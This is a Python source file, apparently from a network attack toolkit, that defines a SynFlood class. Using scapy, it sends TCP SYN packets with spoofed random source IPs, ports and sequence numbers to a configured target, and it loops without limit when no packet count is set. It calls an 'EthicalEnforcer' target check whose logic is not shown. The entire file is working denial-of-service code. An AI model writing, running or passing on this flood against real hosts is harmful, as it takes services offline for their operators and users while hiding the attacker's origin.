from scapy.all import IP, TCP, send
import asyncio
from core.ethical_check import EthicalEnforcer
from core.network_utils import random_ip
import random

class SynFlood:
    def __init__(self):
        self.eth = EthicalEnforcer()
        
    async def attack(self, config):
        self.eth.validate_target(config.target)
        packets_sent = 0
        
        while True:
            if config.packets > 0 and packets_sent >= config.packets:
                break
                
            # Craft SYN packets with random IPs and ports
            ip_layer = IP(src=random_ip(), dst=config.target)
            tcp_layer = TCP(sport=random.randint(1024, 65535), 
                          dport=config.port, 
                          flags="S", 
                          seq=random.randint(1000, 4294967295),
                          window=random.randint(1000, 65535))
            
            send(ip_layer/tcp_layer, verbose=0)
            packets_sent += 1
            
            if packets_sent % 100 == 0:
                print(f"Sent {packets_sent} SYN packets", end='\r')
        
        print(f"\nSYN flood completed. Total packets: {packets_sent}")